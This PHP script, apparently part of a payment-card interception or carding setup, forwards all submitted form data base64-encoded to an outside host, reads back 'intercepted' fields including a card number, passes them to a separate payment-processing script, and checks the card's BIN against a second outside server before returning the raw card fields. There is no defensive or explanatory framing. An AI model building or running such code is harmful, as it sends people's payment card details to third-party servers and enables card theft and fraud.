<?php
header('Content-Type: application/json');

$data = $_POST;
$json = json_encode($data);
$base64 = base64_encode($json);
$url = 'https://pesaflow.fly.dev/?obj=' . urlencode($base64);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

// If cURL failed
if ($error) {
    echo json_encode([
        'success' => false,
        'error' => "Curl error: $error",
        'raw_response' => $response
    ]);
    exit;
}

// Try decode
$parsed = json_decode($response, true);

// If not JSON, return raw content for debugging
if (json_last_error() !== JSON_ERROR_NONE || !isset($parsed['intercepted'][0]['fields'])) {
    echo json_encode([
        'success' => false,
        'error' => 'Full response is not valid JSON or expected format',
        'json_error' => json_last_error_msg(),
        'http_code' => $httpCode,
        'raw_response' => $json
    ]);
    exit;
}

// Normal flow continues here if JSON is valid
$fields = $parsed['intercepted'][0]['fields'];
$_POST = $fields;
ob_start();
include 'cybersrc.php';
$interpreted = json_decode(ob_get_clean(), true);

// Get BIN info
$bin = substr(preg_replace('/\\D/', '', $fields['card_number'] ?? ''), 0, 6);
$binData = [];
if ($bin) {
    $binUrl = 'https://payment.tsavo.site/get_bin.php?bin=' . urlencode($bin);
    $ch = curl_init($binUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $binResp = curl_exec($ch);
    if (!curl_error($ch)) {
        $binData = json_decode($binResp, true);
    }
    curl_close($ch);
}

echo json_encode([
    'success' => true,
    'cybersource_interpretation' => $interpreted,
    'bin_info' => $binData,
    'raw_fields' => $fields
]);
